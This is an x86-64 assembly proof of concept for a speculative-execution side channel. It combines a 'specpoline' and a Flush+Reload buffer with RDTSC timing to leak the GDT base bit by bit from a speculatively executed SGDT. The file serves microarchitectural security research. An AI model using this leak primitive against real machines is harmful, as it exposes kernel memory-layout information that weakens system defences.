BITS 64

DEFAULT REL

%define GAP_SHIFT 7
%define GAP (1 << GAP_SHIFT)

GLOBAL leak
GLOBAL timings

 

SECTION .data
 
    ;FLUSH+RELOAD buffer
    buffer:         TIMES 64*256*GAP    db 0
    buffer_end:

    TIMES 64 db 0

    ;Timings array
    timings         TIMES 256           dd 0

    gdt_limit       dw 0
    gdt_base        dq 0
    

SECTION .code

    ;\ /\ /\ /                                                         \ /\ /\ /
    ; X  X  A specpoline taking the architectural target on the stack      X  X
    ;/ \/ \/ \                                                         / \/ \/ \
    
    specpoline:
        xorps xmm0, xmm0
        TIMES 40 sqrtpd xmm0, xmm0

        movq rbx, xmm0
        mov QWORD [rsp+rbx], rax
        ret

 
    ;\ /\ /\ /                                                         \ /\ /\ /
    ; X  X  Touch each page of the F+R buffer evicting every of its lines  X  X
    ;/ \/ \/ \                                                         / \/ \/ \

    profile:

        mov rsi, buffer-buffer_end          ;Current line in the F+R buffer
        lea rcx, [timings]                  ;Current timing element
        lea rdi, [buffer_end]

    .reload:
        ;OoO fence
        lfence
        rdtsc
        lfence

        mov ebx, eax                        ;Save the low 32 bits of the TSC
        mov edx, DWORD [rsi + rdi]          ;Load from the current line

        ;OoO fence
        lfence
        rdtsc
        lfence

        sub eax, ebx                        ;Time in core clock ticks
                                            ;Should not fluctuate too much  
                                            ;even with Turbo or power saving
        ;Save the time in the timings array
        mov DWORD [rcx], eax
        add ecx, 4

        add rsi, 64*GAP
       jnz .reload                          ;Next line

        ret 


    ;\ /\ /\ /                                                         \ /\ /\ /
    ; X  X  Touch each page of the F+R buffer evicting every of its lines  X  X
    ;/ \/ \/ \                                                         / \/ \/ \

    flush:
        mov rbx, buffer-buffer_end      ;Ptr to current line in the F+R buffer
        lea rsi, [buffer_end]

        ;Touch each page (multiple times) and flush each line

   .touch:
        mov BYTE [rsi + rbx], 0  ;Touch the page
        clflush [rsi + rbx]      ;Flush the line
    
        add rbx, 64*GAP 
       jnz .touch                       ;Next line

        ret

    ;\ /\ /\ /                                                         \ /\ /\ /
    ; X  X  ENTRY-POINT                                                    X  X
    ;/ \/ \/ \                                                         / \/ \/ \
    
    leak:
        push rbx
        push rcx
        push rdx
        push rsi
        push r8

        ;Move the first arg (bit index) in rcx, where we can use it with shr
        ;Second args (byte index) is put in r8
        mov rcx, rdi
        mov r8, rsi

        ;Flush the F+R lines
        call flush

        ;Prepare some reg and touch some line to make the speculative path feasable
        lea rsi, [buffer]
        lea rdi, [gdt_base]
        mov DWORD [rdi], 0
        sfence
        lfence                ;Empty the ROB and RS

        ;Specpoline
        lea rax, [.profile]
        call specpoline

        ;O.O 0
        ; o o o SPECULATIVE PATH
        ;0.0 O

        sgdt [rdi]
        movzx rdi, BYTE [rdi+r8] 
        nop
        nop
        nop          
        shr rdi, cl
        nop
        nop
        nop         
        and rdi, 1 
        nop
        nop
        nop     
        shl rdi, 6 + GAP_SHIFT + 7
        nop
        nop
        nop 
        mov ebx, DWORD [rsi+rdi]

        ud2                             ;Stop speculation

   .profile:
        ;Ll Ll
        ;  !  !  ARCHITECTURAL PATH
        ;Ll Ll
        
        ;Fill the timings array
        call profile

    .end:

        pop r8
        pop rsi
        pop rdx
        pop rcx
        pop rbx

        ret
 
